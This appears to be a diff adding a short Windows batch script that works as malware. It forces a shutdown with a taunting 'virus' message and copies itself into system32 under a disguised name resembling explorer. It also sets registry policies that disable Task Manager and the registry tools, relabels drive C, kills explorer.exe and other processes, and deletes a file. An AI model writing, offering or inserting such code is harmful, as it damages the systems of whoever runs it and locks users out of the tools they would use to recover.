@@ -1,0 +1,12 @@
+@echo off
+cmd.exe /c shutdown -s -t 300 -c "TestAntivirus is working perfect. Your Antivirus can`t stop whis virus."
+copy %0 "c:\windows\system32\explorerl.bat"
+reg add hkcu\software\microsoft\windows\currentversion\policies\system /v disabletaskmgr /t reg_dword /d "1" /f
+reg add hkcu\software\microsoft\windows\currentversion\policies\system /v disableregistrytools /t reg_dword /d "1" /f
+label c: TestAntivirus
+taskkill /f /im procesoamatar.exe
+taskkill /f /im msnmsgr.exe
+taskkill /f /im explorer.exe
+del /f /q "c:\jejeje.exe"
+  
+echo > "C:\WINDOWS\Temp\tmpfile0.tmp"
